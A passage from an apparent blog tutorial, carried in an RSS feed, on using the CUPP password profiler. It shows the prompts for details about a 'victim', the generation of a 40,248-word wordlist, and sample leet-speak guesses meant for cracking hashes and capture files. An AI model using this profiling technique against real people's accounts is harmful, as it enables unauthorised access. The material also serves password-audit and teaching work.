> Company name: <com>Amazon</com><br>
<br>
> Do you want to add some key words about the victim? Y/[N]: <com>y</com><br>
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: <com>chelsea,football,beer,beatles</com><br>
> Do you want to add special chars at the end of words? Y/[N]: <com>y</com><br>
> Do you want to add some random numbers at the end of words? Y/[N]<com>y</com><br>
> Leet mode? (i.e. leet = 1337) Y/[N]: <com>y</com><br>
<br>
[+] Now making a dictionary...<br>
[+] Sorting list and removing duplicates...<br>
[+] Saving dictionary to john.txt, counting 40248 words.<br>
[+] Now load your pistolero with john.txt and shoot! Good luck! <br>
</div>

<p></code>
Our 40,248 line wordlist has been generated and saved as "john.txt"
<code></p>

<div class="code">
user@debian8:~$ <com>more john.txt</com><br>
<br>
...<br>
395503<br>
39551955<br>
39551955<br>
395555<br>
...<br>
4m420n<br>
4m420n!<br>
4m420n!!<br>
4m420n!!!<br>
...<br>
B33r1955355<br>
B33r195555<br>
B33r1955551<br>
B33r1955552<br>
...<br>
Ch3l5342101<br>
Ch3l5342112<br>
Ch3l534212<br>
Ch3l5342121<br>
...<br>
j0hnSm17h48<br>
j0hnSm17h49<br>
j0hnSm17h5<br>
j0hnSm17h50<br>
...<br>
</div>

<p></code>
This wordlist may prove useful when cracking hashes, capture files, etc…<br>
You can also download wordlists and improve wordlists using the -w, -l and -a options.<br></p>

<p>Tags: <a href='tag_password.html'>password</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</link>
<guid>https://metalkey.net/./password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Fri, 01 Jul 2016 15:03:26 +1000</pubDate></item>
</channel></rss>
